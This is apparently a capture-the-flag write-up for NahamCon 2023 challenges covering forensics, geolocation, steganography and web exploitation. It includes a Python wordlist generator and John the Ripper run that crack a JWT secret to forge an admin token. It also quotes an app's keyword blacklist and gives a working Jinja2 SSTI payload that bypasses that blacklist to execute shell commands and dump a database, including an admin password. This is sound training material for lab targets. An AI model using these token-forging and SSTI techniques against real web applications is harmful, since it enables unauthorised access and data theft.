<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ <span class="nb">cd</span> /proc/11/
</span></span><span class="line"><span class="cl">user@zombie:/proc/11$ ls
</span></span><span class="line"><span class="cl">arch_status      clear_refs       cpuset           fd               limits           mem              net              oom_score        projid_map       setgroups        stat             task             uid_map
</span></span><span class="line"><span class="cl">attr             cmdline          cwd              fdinfo           loginuid         mountinfo        ns               oom_score_adj    root             smaps            statm            timens_offsets   wchan
</span></span><span class="line"><span class="cl">auxv             comm             environ          gid_map          map_files        mounts           numa_maps        pagemap          schedstat        smaps_rollup     status           timers
</span></span><span class="line"><span class="cl">cgroup           coredump_filter  exe              io               maps             mountstats       oom_adj          personality      sessionid        stack            syscall          timerslack_ns
</span></span></code></pre></div><p><code>fd</code> refers to file descriptors, which might contain info from stdin, stdout, etc.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:/proc/11$ <span class="nb">cd</span> fd
</span></span><span class="line"><span class="cl">user@zombie:/proc/11/fd$ ls
</span></span><span class="line"><span class="cl"><span class="m">0</span>  <span class="m">1</span>  <span class="m">2</span>  <span class="m">3</span>
</span></span><span class="line"><span class="cl">user@zombie:/proc/11/fd$ ls -al
</span></span><span class="line"><span class="cl">total <span class="m">0</span>
</span></span><span class="line"><span class="cl">dr-x------    <span class="m">2</span> user     user             <span class="m">0</span> Jun <span class="m">15</span> 22:42 .
</span></span><span class="line"><span class="cl">dr-xr-xr-x    <span class="m">9</span> user     user             <span class="m">0</span> Jun <span class="m">15</span> 22:41 ..
</span></span><span class="line"><span class="cl">lr-x------    <span class="m">1</span> user     user            <span class="m">64</span> Jun <span class="m">15</span> 22:43 <span class="m">0</span> -&gt; /dev/null
</span></span><span class="line"><span class="cl">l-wx------    <span class="m">1</span> user     user            <span class="m">64</span> Jun <span class="m">15</span> 22:43 <span class="m">1</span> -&gt; /dev/null
</span></span><span class="line"><span class="cl">l-wx------    <span class="m">1</span> user     user            <span class="m">64</span> Jun <span class="m">15</span> 22:43 <span class="m">2</span> -&gt; /dev/null
</span></span><span class="line"><span class="cl">lr-x------    <span class="m">1</span> user     user            <span class="m">64</span> Jun <span class="m">15</span> 22:43 <span class="m">3</span> -&gt; /home/user/flag.txt <span class="o">(</span>deleted<span class="o">)</span>
</span></span></code></pre></div><p>While we do see that it notes flag.txt is deleted. However, perhaps we can still see something, since the program is still in running memory?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:/proc/11/fd$ cat <span class="m">3</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>6387e800943b0b468c2622ff858bf744<span class="o">}</span>
</span></span></code></pre></div><p>And the flag is here. Clearly a simple <code>rm</code> might not be enough to exterminate the file out of existence. However, this situation is probably a little unusual since the <code>tail -f</code> was still running long after the rm command.</p>
<p><code>flag{6387e800943b0b468c2622ff858bf744}</code></p>
<h2 id="osint">OSINT</h2>
<h3 id="chall1">Chall1</h3>
<blockquote>
<p>Author: @Gary#4657</p>
<p>Head over to <a href="https://osint.golf">https://osint.golf</a> and select <strong><code>chall1</code> under the NahamCon2023</strong> category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!</p>
</blockquote>
<hr>
<p>First challenge places us on a golf course, at some kind of ceremony/speech.
The first object of interest is the large event banner, containing the phrase &ldquo;all Thailand Premier Championship&rdquo;. There is more text, Road to (something), that I was unable to accurately read.</p>
<p><img src="images/20230615163821.png" alt="Pasted image 20230615163821.png"></p>
<p>Searching for <code>all Thailand</code>, we quickly see a webpage for a <a href="https://www.allthailandgolftour.com/">golf tour org</a>. It seems like the right track. One common word that I found appearing was Singha, which might be matching in our image&rsquo;s banner: &ldquo;Road to Singha (something)&rdquo;. The final word was still not readable for me, but this is enough to go on. Searching the golf tour website, I found <a href="https://www.youtube.com/embed/-HSBJw_06XQ?rel=0&amp;wmode=transparent&amp;autoplay=1">all Thailand Premier Championship - Road to Singha Masters</a> located on the media page. Following the link takes us to a video, and right away in the video we are given a location&ndash;Singha Park in Khon Kaen.</p>
<p><img src="images/20230615164252.png" alt="Pasted image 20230615164252.png"></p>
<p><img src="images/20230615164335.png" alt="Pasted image 20230615164335.png"></p>
<p>I found the tolerance to be rather strict, so I ended up locating the same exact capture on Google Maps as well.</p>
<p><img src="images/20230615164520.png" alt="Pasted image 20230615164520.png"></p>
<p>Finally with the pinpointed location, we get the flag.</p>
<p><code>flag{3e3d01a002db29fec2a5e10ec758b852}</code></p>
<h3 id="chall2">Chall2</h3>
<blockquote>
<p>Author: @Gary#4657</p>
<p>Head over to <a href="https://osint.golf">https://osint.golf</a> and select <strong><code>chall2</code> under the NahamCon2023</strong> category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!<br>
<em>NOTE:</em> The integrated compass direction is inconsistent with the actual panorama representation.</p>
</blockquote>
<hr>
<p>The second challenge places us on a large boat near a dock, with vehicles on it. Unfortunately, boats very commonly travel internationally, so things such as language/flags on the boat may not give us interesting information. The land appears to have some unusual architecture, so I decided to screencap this region and see what a google image search can give me.</p>
<p><img src="images/2023-06-1516-50-43.png" alt="Screenshot from 2023-06-15 16-50-43.png"></p>
<p>Very quickly I find a very similar capture, labeling it <a href="http://50yearsinitaly.blogspot.com/2012/11/napoleons-elba-hideaway.html">Napoleon&rsquo;s Elba Hideaway</a>.
The article notes that this location is in Portoferraio, Italy.</p>
<p><img src="images/20230615165719.png" alt="Pasted image 20230615165719.png"></p>
<p><img src="images/20230615165808.png" alt="Pasted image 20230615165808.png"></p>
<p>Once again, the pointing at the dock itself is not specific enough. After a bit more trial and error, I find the exact location:</p>
<p><img src="images/20230615170122.png" alt="Pasted image 20230615170122.png"></p>
<p><code>flag{e54fcc18854f0adfdedf22120c346b3a}</code></p>
<h3 id="chall3">Chall3</h3>
<blockquote>
<p>Author: @Gary#4657</p>
<p>Head over to <a href="https://osint.golf">https://osint.golf</a> and select <strong><code>chall3</code> under the NahamCon2023</strong> category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!</p>
</blockquote>
<hr>
<p>We are now in a park. Notably, there are large buildings on all sides of the park. We must be in not only a major city, but a city with a sizeable space dedicated to a grassy open park. My first inclination is New York City with its quite sizeable Central Park. Checking the terrain map, the Sheep Meadow location is a wide grassy area. I look for a street view and know right away that this is a match.
From chall3:</p>
<p><img src="images/20230615170757.png" alt="Pasted image 20230615170757.png"></p>
<p>From Sheep Meadow street view:</p>
<p><img src="images/20230615170908.png" alt="Pasted image 20230615170908.png"></p>
<p>Once again, finding the same view location as the challenge:</p>
<p><img src="images/20230615171150.png" alt="Pasted image 20230615171150.png"></p>
<p><code>flag{aa1b04ee3ded3a7c3ee16be1ff85e99c}</code></p>
<h3 id="chall4">Chall4</h3>
<blockquote>
<p>Author: @Gary#4657</p>
<p>Head over to <a href="https://osint.golf">https://osint.golf</a> and select <strong><code>chall4</code> under the NahamCon2023</strong> category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!<br>
<em>NOTE:</em> The integrated compass direction is inconsistent with the actual panorama representation.</p>
</blockquote>
<hr>
<p>In the final Geosint challenge, we are given a drone shot of what seems to be a suburban area setting. We are too far away do identify anything such as the language on signs or country flags, but we can note the very large number of train track lanes. Some buildings in the distance appear to have uncommon architecture, but not enough for me to draw any conclusions. My first guess is to take the most eye-catching building and see what image searches can do for me.</p>
<p><img src="images/2023-06-1517-16-51.png" alt="Screenshot from 2023-06-15 17-16-51.png"></p>
<p>From this image, it was quickly identified as Bratislava Castle of Bratislava, Slovakia. This location does not match geographically, but the building&rsquo;s design and colors match very well. The second building I searched for is the neighboring church-like building.</p>
<p><img src="images/2023-06-1517-27-17.png" alt="Screenshot from 2023-06-15 17-27-17.png"></p>
<p>There were several identical matches for seemingly different buildings. However, one in particular mentions a castle with it in combination. <a href="https://www.komoot.com/highlight/3217858">this web posting</a> seems to be reviewing it as a bike trail. Examining the geography in a google map search for <code>Schloss Ebenfurth</code>, it instantly became clear that this is the same location as the challenge.</p>
<p><img src="images/20230615173152.png" alt="Pasted image 20230615173152.png"></p>
<p><img src="images/20230615173224.png" alt="Pasted image 20230615173224.png"></p>
<p>I was unable to find the same capture on Google Maps, but since this is an arial view, we can get a pretty good idea where it might be without too much trouble.</p>
<p><code>flag{2e57cfe16d7e1c5431aa3b99d0e713cb}</code></p>
<h2 id="web">Web</h2>
<h3 id="hidden-figures">Hidden Figures</h3>
<blockquote>
<p>Author: @JohnHammond#6971</p>
<p>Look at this fan page I made for the Hidden Figures movie and website! Not everything is what it seems!</p>
</blockquote>
<hr>
<p>Entering the website we see a pretty well-constructed page promoting <code>Hidden Figures</code>, a pretty popular book/movie. None of the links take us to other pages, so there is little to be explored.
Early on, I noticed that folder directory <code>/assets/</code> is free to view. I thought perhaps there might be something hidden here, or in another commonly used folder type?</p>
<p><img src="images/20230616185356.png" alt="Pasted image 20230616185356.png"></p>
<p>After some lengthy enumeration, I found nothing of interest.</p>
<p>Looking at the page source, I noticed that there are several links with <em>very</em> long url codes:</p>
<pre tabindex="0"><code>data:image/png;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/7RqcUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAFocAVoAAxslRxwCAAACAAAcAngAFVdvbWFuIG9mIE5BU0EgTGFuZ2xleRwCVQAPRGF2aWQgQy4gQm93bWFuHAI3AAgyMDE0MDMyMBwCPAALMDkxNTA2KzAwMDA4QklNBCUAAAAAABBbRWm4H1TKYVo1ObYsy6/POEJJTQQ6AAAAAAESAAAAEAAAAAEAAAAAAAtwcmludE91dHB1dAAAAAUAAAAAUHN0U2Jvb2wBAAAAAEludGVlbnVtAAAAAEludGUAAAAASW1nIAAAAA9wcmludFNpeHRlZW5CaXRib29sAAAAAAtwcmludGVyTmFtZVRFWFQAAAAWAEUAUABTAE8ATgAgAFMAdAB5AGwAdQBzACAAUAByAG8AIAA3ADkAMAAwAAAAAAAPcHJpbnRQcm9vZlNldHVwT2JqYwAAAAwAUAByAG8AbwBmACAAUwBlAHQAdQBwAAAAAAAKcHJvb2ZTZXR1cAAAAAEAAAAAQmx0bmVudW0AAAAMYnVpbHRpblByb29mAAAADHByb29mTW9uaXRvcjhCSU0EOwAAAAACLQAAABAAAAABAAAAAAAScHJpbnRPdXRwdXRPcHRpb25zAAAAFwAAAABDcHRuYm9vbAAAAAAAQ2xicmJvb2wAAAAAAFJnc01ib29sAAAAAABDcm5DYm9vbAAAAAAAQ250Q2Jvb2wAAAAAAExibHNib29sAAAAAABOZ3R2Ym9vbAAAAAAARW1sRGJvb2wAAAAAAEludHJib29sAAAAAABCY2tnT2JqYwAAAAEAAAAAAABSR0JDAAAAAwAAAABSZCAgZG91YkBv4AAAAAAAAAAAAEdybiBkb3ViQG/gAAAAAAAAAAAAQmwgIGRvdWJAb+AAAAAAAAAAAA
&lt;...SNIP...&gt;
</code></pre><p>And so on. I didn&rsquo;t know this was possible or ever really done, but it appears that some websites might provide their images in base64 encoded data like this so that images can be loaded without retrieving data from other pages. This seems to be what is going on here, as following the link takes me to an image regardless of the website&rsquo;s running state.</p>
<p>Eventually I thought to download each of the images located on the website. While reviewing this challenge I discovered that saving the image directly is enough, but at the time I had decided to copy/paste the entire url into a file. After removing <code>data:image/png;base64,</code> I base64 decoded the info:</p>
<pre tabindex="0"><code>$ cat url | base64 -d &gt; decode_url 
</code></pre><p>And so on, for all 4 images found.</p>
<p>Checking <code>exiftool</code> didn&rsquo;t give me any critical information, however <code>binwalk</code> did show me something <em>hidden</em> in the figures.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ binwalk decode_url2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">0</span>             0x0             JPEG image data, JFIF standard 1.01
</span></span><span class="line"><span class="cl"><span class="m">15486</span>         0x3C7E          PNG image, <span class="m">1851</span> x 174, 8-bit/color RGB, non-interlaced
</span></span><span class="line"><span class="cl"><span class="m">15527</span>         0x3CA7          Zlib compressed data, default compression
</span></span></code></pre></div><p>There is another image hidden here, and potentially some compressed data?
Extracting with binwalk:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ binwalk -D<span class="o">=</span><span class="s2">&#34;.*&#34;</span> decode_url2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">0</span>             0x0             JPEG image data, JFIF standard 1.01
</span></span><span class="line"><span class="cl"><span class="m">15486</span>         0x3C7E          PNG image, <span class="m">1851</span> x 174, 8-bit/color RGB, non-interlaced
</span></span><span class="line"><span class="cl"><span class="m">15527</span>         0x3CA7          Zlib compressed data, default compression
</span></span></code></pre></div><p>Viewing the hidden PNG image:</p>
<p><img src="images/20230617121633.png" alt="Pasted image 20230617121633.png"></p>
<p><code>flag{e62630124508ddb3952843f183843343}</code></p>
<h3 id="marmalade-5">Marmalade 5</h3>
<blockquote>
<p>Author: @congon4tor#2334</p>
<p>Enjoy some of our delicious home made marmalade!</p>
</blockquote>
<hr>
<p>We are prompted to choose a username to log in. No password asked. Firstly trying admin, of course we are not allowed. So I go with my old friend <code>asdf</code>.</p>
<p><img src="images/20230615153302.png" alt="Pasted image 20230615153302.png"></p>
<p>On login, it tells us that only admin can see the flag:</p>
<p><img src="images/20230616173145.png" alt="Pasted image 20230616173145.png"></p>
<p>With how little content is on these pages, there is pretty much nothing else to consider other than editing the given cookie:
<code>token=eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg</code>
Based on the cookie having 3 sections separated by dots, I immediately recognize this as a JWT. Using jwt.io to decode:</p>
<p><img src="images/20230616173339.png" alt="Pasted image 20230616173339.png"></p>
<p>The blue segment is a signature hashed with a secret key to prevent forgery, but this is not always used to verify. Perhaps we can just edit the Payload section so that our username is admin?</p>
<pre tabindex="0"><code>{
  &#34;username&#34;: &#34;admin&#34;
}
</code></pre><p>Converting back to base64, our new token looks like this
<code>eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.SKkdg9_2EbXj67FcZNnXIg</code></p>
<p>When I edit the cookie, it gives me an interesting new error:</p>
<p><img src="images/20230616173646.png" alt="Pasted image 20230616173646.png"></p>
<pre tabindex="0"><code># Bad Request

Invalid signature, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg*****
</code></pre><p>So while they are checking the token signatures, they did a bit of an oopsie and gave away most of their secret key!! Only the last 5 characters are hidden, making this secret key effectively 5 characters in length. This is something that can be brute-forced rather easily.</p>
<p>I used python to quickly generate a wordlist containing the known secret string, then appended all possible 5 letter combinations:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;wordlist.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;fsrwjcfszeg&#39;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">l</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="o">+</span>  <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>From this point, I can use my previously valid JWT for asdf, and use <code>John the Ripper</code> to brute force the secret key. John will accept the token when the signature is presented in hex, however I had trouble converting myself for some reason. This issue was resolved once I used <a href="https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py">Sjord&rsquo;s jwtcrack code</a> to recreate my token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python convert.py <span class="s1">&#39;eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg&#39;</span>
</span></span><span class="line"><span class="cl">eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ#48a91d83dff611b5e3ebb15c64d9d722
</span></span></code></pre></div><p>Cracking the secret with john:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ john jwt.txt --wordlist<span class="o">=</span>wordlist.txt --format<span class="o">=</span>HMAC-MD5
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>HMAC-MD5 <span class="o">[</span>password is key, MD5 256/256 AVX2 8x3<span class="o">])</span>
</span></span><span class="line"><span class="cl">Warning: poor OpenMP scalability <span class="k">for</span> this <span class="nb">hash</span> type, consider --fork<span class="o">=</span><span class="m">2</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">fsrwjcfszegvsyfa <span class="o">(</span>?<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:04 DONE <span class="o">(</span>2023-06-16 13:39<span class="o">)</span> 0.2487g/s 2472Kp/s 2472Kc/s 2472KC/s fsrwjcfszegvsxlg..fsrwjcfszegvtppv
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=HMAC-MD5&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed. 
</span></span></code></pre></div><p>The secret key is <code>fsrwjcfszegvsyfa</code>
Now to generate a valid signature for our forged jwt. Using the first 2 base64 encoded segments, we perform HMAC-MD5 hashing, then convert from hex back to base64:</p>
<p><img src="images/20230616174953.png" alt="Pasted image 20230616174953.png"></p>
<p>Finalized token:</p>
<pre tabindex="0"><code>eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.kpCxx3dVioNEfybFE2UBxg
</code></pre><p>Upon refreshing the page, we get the flag.</p>
<p><img src="images/20230616141001.png" alt="Pasted image 20230616141001.png"></p>
<p><code>flag{a249dff54655158c25ddd3584e295c3b}</code></p>
<h3 id="obligatory">Obligatory</h3>
<blockquote>
<p>Author: @congon4tor#2334</p>
<p>Every Capture the Flag competition has to have an obligatory to-do list application, right???</p>
</blockquote>
<hr>
<p>Firstly, we are greeted with a sign-in page</p>
<p><img src="images/20230616165433.png" alt="Pasted image 20230616165433.png"></p>
<p>Typical admin:admin guesses do not work, so after making a new account</p>
<p><img src="images/20230616165611.png" alt="Pasted image 20230616165611.png"></p>
<p>I created a new task <code>asdf</code>, and this is the result. After exploring the POST parameters done during submission, as well as how things are altered when tasks are moved between active and completed, I did not see any interesting pattern. The most notable piece is that trashing my first task leads to <code>http://challenge.nahamcon.com:32053/delete?id=2</code>. However, <code>id=1</code> appears inaccessible.</p>
<p>When I turned my attention to the greentext, I noticed in the url we see this as well:
<code>http://challenge.nahamcon.com:32053/?success=Task%20created</code>
Editing the success= component will affect what is being displayed in green. After playing for a bit, I noticed that this is actually vulnerable to SSTI:
<code>http://challenge.nahamcon.com:32053/?success={{7*7}}</code></p>
<p><img src="images/20230616154856.png" alt="Pasted image 20230616154856.png"></p>
<p>Doing actions such as <code>curl -v</code> did not give any insight on the framework being used, but exploring the SSTI a little further gave me the impression that this is likely Jinja2:
`<a href="http://challenge.nahamcon.com:32053/?success=%7B%7B7">http://challenge.nahamcon.com:32053/?success={{7</a>*&lsquo;7&rsquo;}}``</p>
<p><img src="https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616155028.png" alt="Pasted image 20230616155028.png"></p>
<p>Knowing this, I tried some simple enumerations before I find the true difficulty of this challenge:
<code>http://challenge.nahamcon.com:32053/?success={{config}}</code></p>
<p><img src="https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616170342.png" alt="Pasted image 20230616170342.png"></p>
<pre tabindex="0"><code>HACKER DETECTED!!!!  
The folowing are not allowed: [ {{\s*config\s*}},.*class.*,.*mro.*,.*import.*,.*builtins.*,.*popen.*,.*system.*,.*eval.*,.*exec.*,.*\..*,.*\[.*,.*\].*,.*\_\_.* ]
</code></pre><p>It wasn&rsquo;t obvious to me at first, but the real trouble is that any command containing a dot, or square brackets, is blocked.
After spending a good amount of time looking for ways to bypass the filter, I eventually ran into <a href="https://hackmd.io/@Chivato/HyWsJ31dI">this post</a>. Importantly, the writer manages to create a payload to bypass &ldquo;.&rdquo;,&quot;_&quot;, &ldquo;[]&rdquo;, and even &ldquo;|join&rdquo;.</p>
<pre tabindex="0"><code>{{request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()}}
</code></pre><p>Our blacklist also includes some functions that were used, which I bypassed by breaking between quotes (popen -&gt; po&rsquo;&lsquo;pen).</p>
<pre tabindex="0"><code>http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27id%27)|attr(%27read%27)()}}
</code></pre><p><img src="https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616171249.png" alt="Pasted image 20230616171249.png"></p>
<p>We have successful code execution!! Now all that remains is to find the flag.</p>
<p>After some enumeration of where the flag might be, I began to think that perhaps there isn&rsquo;t a <code>flag.txt</code> file after all. When I check the contents of the cwd:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root     root          <span class="m">4096</span> Jun <span class="m">14</span> 17:54 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root     root          <span class="m">4096</span> Jun <span class="m">14</span> 17:54 ..
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> uwsgi    uwsgi         <span class="m">4096</span> Jun <span class="m">16</span> 20:55 DB
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> root     root           <span class="m">159</span> Jun <span class="m">14</span> 17:53 app.ini
</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> root     root          <span class="m">6693</span> Jun <span class="m">14</span> 17:53 app.py
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> root     root           <span class="m">792</span> Jun <span class="m">14</span> 17:53 models.py
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> root     root           <span class="m">138</span> Jun <span class="m">14</span> 17:53 requirements.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root     root          <span class="m">4096</span> Jun <span class="m">14</span> 17:53 templates
</span></span></code></pre></div><p>I notice the DB folder, and I recall that my task id&rsquo;s started at 2. Perhaps the flag is in admin&rsquo;s task list, for id number 1?</p>
<p>Looking inside the DB folder:</p>
<pre tabindex="0"><code>drwxr-xr-x    1 uwsgi    uwsgi         4096 Jun 16 20:55 .
drwxr-xr-x    1 root     root          4096 Jun 14 17:54 ..
-rw-r--r--    1 uwsgi    uwsgi        16384 Jun 16 20:55 db.sqlite
</code></pre><p>Unfortunately, opening a sqlite file is a bit tricky with the RCE that I am currently using. Moreover, dots are still blacklisted. It is fortunate that this folder only has one file, so we can use wildcard * to select <code>db.sqlite</code> without using dot. When I try <code>cat /usr/src/app/DB/*</code>:</p>
<p><img src="images/20230616172048.png" alt="Pasted image 20230616172048.png"></p>
<p>It seems there are issues when trying to output invalid characters, causing the internal server error. As a last attempt, I decided to try <code>strings</code>, which should only output legitimate utf-8 friendly characters. However, it is not guaranteed that the flag could remain intact for this.</p>
<p>Request:</p>
<pre tabindex="0"><code>view-source:http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27strings%20/usr/src/app/DB/db*%27)|attr(%27read%27)()}}
</code></pre><p>Output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tabletasktask
</span></span><span class="line"><span class="cl">CREATE TABLE task <span class="o">(</span>
</span></span><span class="line"><span class="cl">	id INTEGER NOT NULL, 
</span></span><span class="line"><span class="cl">	name VARCHAR<span class="o">(</span>100<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	completed BOOLEAN, 
</span></span><span class="line"><span class="cl">	user_id INTEGER, 
</span></span><span class="line"><span class="cl">	PRIMARY KEY <span class="o">(</span>id<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	CHECK <span class="o">(</span>completed IN <span class="o">(</span>0, 1<span class="o">))</span>, 
</span></span><span class="line"><span class="cl">	FOREIGN KEY<span class="o">(</span>user_id<span class="o">)</span> REFERENCES user <span class="o">(</span>id<span class="o">)</span>
</span></span><span class="line"><span class="cl">tableuseruser
</span></span><span class="line"><span class="cl">CREATE TABLE user <span class="o">(</span>
</span></span><span class="line"><span class="cl">	id INTEGER NOT NULL, 
</span></span><span class="line"><span class="cl">	username VARCHAR<span class="o">(</span>40<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	password VARCHAR<span class="o">(</span>50<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	PRIMARY KEY <span class="o">(</span>id<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	UNIQUE <span class="o">(</span>username<span class="o">)</span>
</span></span><span class="line"><span class="cl">indexsqlite_autoindex_user_1user
</span></span><span class="line"><span class="cl">asdfasdf
</span></span><span class="line"><span class="cl">-adminT2dUL6Z#S9KH%x%i
</span></span><span class="line"><span class="cl">asdf
</span></span><span class="line"><span class="cl">	admin
